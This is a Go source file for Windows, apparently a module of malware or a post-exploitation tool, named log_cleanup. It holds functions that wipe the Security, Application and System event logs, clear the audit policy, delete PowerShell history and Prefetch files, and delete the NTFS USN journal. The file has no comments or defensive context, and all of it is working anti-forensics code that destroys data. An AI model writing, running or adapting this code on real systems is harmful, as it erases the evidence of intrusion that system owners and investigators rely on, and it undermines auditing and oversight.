//go:build windows

package log_cleanup

import (
	"os/exec"
)

func ClearEventLogs() bool {
	exec.Command("cmd", "/c", "wevtutil cl Security").Run()
	exec.Command("cmd", "/c", "wevtutil cl Application").Run()
	exec.Command("cmd", "/c", "wevtutil cl System").Run()
	return true
}

func ClearAuditLogs() bool {
	exec.Command("cmd", "/c", "auditpol /clear").Run()
	return true
}

func ClearPowerShellHistory() bool {
	exec.Command("cmd", "/c", "powershell -Command \"Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue\"").Run()
	return true
}

func ClearPrefetch() bool {
	exec.Command("cmd", "/c", "del /f /q C:\\Windows\\Prefetch\\*.*").Run()
	return true
}

func ClearUSNJournal() bool {
	exec.Command("cmd", "/c", "fsutil usn deletejournal /D C:").Run()
	return true
}
